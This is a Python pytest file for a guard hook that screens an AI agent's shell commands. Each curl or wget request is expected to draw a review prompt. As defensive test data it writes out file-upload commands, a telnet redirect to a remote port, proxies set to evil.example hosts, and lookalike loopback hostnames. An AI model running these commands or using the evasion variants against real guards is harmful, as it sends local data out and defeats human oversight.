"""Requests: only one plain curl call to a local server passes; every other request asks."""

import pytest

from tests.runtime import load_script_module


guard = load_script_module("agents/hooks/guard_command.py", "guard_command")
pytestmark = pytest.mark.usefixtures("isolated_project")


REMOTE_REVIEW = (
    "Needs review: remote curl/wget can send local data. Read web pages with the web-fetch tool, "
    "or use gh api / nix store prefetch-file for exact values and files."
)


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("curl -s https://pypi.org/pypi/mutmut/json", id="remote fetches"),
        pytest.param(
            "curl -fsSL -o pkg.tgz -H 'User-Agent: x' https://registry.npmjs.org/a/-/a-1.tgz", id="remote downloads"
        ),
        pytest.param(
            'curl -s -o /dev/null -w "%{http_code}\\n" -X HEAD https://cdn.example.com/v1/a.tar.gz',
            id="remote status probes",
        ),
        pytest.param("wget -q -O - https://example.com/install.sh", id="remote fetches with wget"),
        pytest.param(
            "wget -qO- --timeout=10 --header 'Accept: x' https://example.com/a", id="wget clusters and values"
        ),
        pytest.param("curl -sSo out.html -H 'Accept: text/html' https://example.com/", id="curl clusters with values"),
        pytest.param("curl telnet://example.com:4444 < report.txt", id="other schemes that send input"),
        pytest.param("curl telnet://localhost:23 < report.txt", id="other schemes on this machine"),
        pytest.param("curl gopher://127.0.0.1:70/_x", id="gopher on this machine"),
        pytest.param("curl -K cfg http://localhost:3000/", id="local requests with options from a file"),
        pytest.param(
            "wget -d --post-file=README.md -d https://example.com/upload http://localhost/",
            id="a wget debug flag beside a post and a remote URL",
        ),
        pytest.param("wget --post-data x=1 http://localhost:3000/", id="wget posts to this machine"),
        pytest.param("http_proxy=http://evil.example:8080 curl http://localhost:3000/", id="a proxy for one request"),
        pytest.param(
            "export ALL_PROXY=socks5://evil.example:1080; curl -fsS http://localhost:3000/", id="an exported proxy"
        ),
        pytest.param("env HTTPS_PROXY=http://evil.example curl http://127.0.0.1/", id="a proxy through env"),
        pytest.param("CURL_HOME=./cfg curl http://localhost:3000/", id="another curl configuration"),
        pytest.param("HOME=./cfg wget http://localhost:3000/", id="another home for configuration files"),
        pytest.param(
            "wget -O --max-redirect=0 http://localhost/", id="a redirect limit taken as another option's value"
        ),
        pytest.param("wget --max-redirect=0 --max-redirect=5 http://localhost/", id="an overridden redirect limit"),
        pytest.param("curl -L http://localhost:3000/", id="local requests that follow redirects"),
        pytest.param("curl -sSL http://localhost:3000/", id="redirects in a flag cluster"),
        pytest.param("curl -L -d '@README.md' http://localhost:3000/", id="a local post that may follow a redirect"),
        pytest.param("curl https://localhost.example.com/", id="a host that only starts with localhost"),
        pytest.param("curl http://127.0.0.1.evil.example/", id="a host that only starts with the loopback address"),
        pytest.param("curl http://localhost:3000.evil.example/", id="a host after a port-like suffix"),
        pytest.param("wget https://localhost.example.com/", id="wget to a host that only starts with localhost"),
        pytest.param("wget --post-file README.md http://localhost:3000/", id="wget posting a file to this machine"),
        pytest.param("curl -Kcfg http://localhost:3000/", id="curl options from an attached config file"),
        pytest.param("curl --config cfg http://localhost:3000/", id="curl options from a long config option"),
        pytest.param("curl -xevil http://localhost:3000/", id="an attached curl proxy"),
        pytest.param("wget --config cfg http://localhost:3000/", id="wget options from a config file"),
        pytest.param("wget -e use_proxy=on http://localhost:3000/", id="wget commands toward this machine"),
        pytest.param("wget -iurls http://localhost:3000/", id="wget reading URLs from a file"),
        *(
            pytest.param(
                f"curl {option} -H 'https://example.invalid/upload' -d '@README.md' 'http://localhost/'",
                id=f"curl {option} taking the next option as its value",
            )
            for option in ("-A", "-e", "-u", "-b", "-c", "-T", "-F", "-x", "-w", "-r")
        ),
        pytest.param(
            "curl -sA -H 'https://example.invalid/upload' 'http://localhost/'", id="a valued option in a cluster"
        ),
        pytest.param("curl -r -H 'file:///dev/null' 'http://localhost/'", id="a second file URL"),
        pytest.param("curl 'http://localhost/' file:///dev/null", id="a second URL after the local one"),
        pytest.param(
            "curl -A -H https://example.invalid/upload -d @README.md http://localhost/",
            id="the unquoted counterexample",
        ),
        pytest.param("wget 'http://[::1]/'", id="wget to this machine over IPv6, which may redirect"),
        pytest.param("wget -O - 'http://[::1]/'", id="wget to standard output, which may redirect"),
        pytest.param("wget http://localhost:3000/", id="wget to a local server, which may redirect"),
        pytest.param(
            "env http_pro''xy=http://example.invalid:8080 curl -X POST -d '@README.md' http://localhost:3000/",
            id="a proxy name split by quotes through env",
        ),
        pytest.param(
            "http_proxy=http://example.invalid:8080 curl http://localhost:3000/", id="a lowercase proxy prefix"
        ),
        pytest.param("ALL_PROXY=socks5://example.invalid:1080 curl http://localhost:3000/", id="an ALL_PROXY prefix"),
        pytest.param(
            "env http_pro\\\nxy=http://example.invalid curl http://localhost:3000/",
            id="a proxy name split by a line continuation",
        ),
        pytest.param("export http_proxy=x; curl http://localhost:3000/", id="an exported lowercase proxy"),
        pytest.param("X=1 curl http://localhost:3000/", id="any assignment before a local request"),
        pytest.param("curl http://localhost:3000/ > out.txt", id="a local request with a redirect"),
        pytest.param("true && curl http://localhost:3000/", id="a local request in a list"),
        pytest.param("command curl http://localhost:3000/", id="a local request behind a wrapper"),
        pytest.param("curl --location http://127.0.0.1:8080/", id="the long redirect option"),
        pytest.param("curl --location-trusted http://localhost/", id="trusted redirects"),
        pytest.param("wget -q -O- http://localhost:3000/", id="wget, which follows redirects by default"),
        pytest.param("wget --max-redirect=3 http://localhost:3000/", id="wget with redirects allowed"),
    ],
)
def test_remote_requests_ask_and_point_to_safer_tools(capsys: pytest.CaptureFixture[str], command: str) -> None:
    verdict = guard.decide("allowed", {"tool_input": {"command": command}})
    assert verdict.decision == "ask"
    assert REMOTE_REVIEW in verdict.reason
    assert capsys.readouterr() == ("", "")
